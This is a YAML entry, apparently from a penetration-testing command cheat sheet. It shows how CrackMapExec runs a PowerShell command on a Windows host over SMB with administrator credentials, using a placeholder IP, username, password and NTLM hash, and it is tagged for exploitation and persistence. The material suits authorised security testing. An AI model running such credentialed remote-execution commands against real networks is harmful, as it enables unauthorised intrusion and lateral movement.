---
description: |
  "CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks." - https://github.com/byt3bl33d3r/CrackMapExec/wiki. This command will execute a powershell command on the target machine if the user has Administrator privileges. using "-x" will execute from cmd.

  Command Reference:

  	Target IP: 10.10.10.1

  	Username: john

  	Password: password123

  	Hash (-H):  807726fcf9f188adc26eeafd7dc16bb7

command: |
  crackmapexec smb 10.10.10.1 -u 'john' -p 'password123' -X 'whoami'
items:
  - Username
  - Password
  - Hash
services:
  - SMB
attack_types:
  - Exploitation
  - Persistence
OS:
  - Linux
references:
  - https://github.com/byt3bl33d3r/CrackMapExec
  - https://github.com/byt3bl33d3r/CrackMapExec/wiki
---
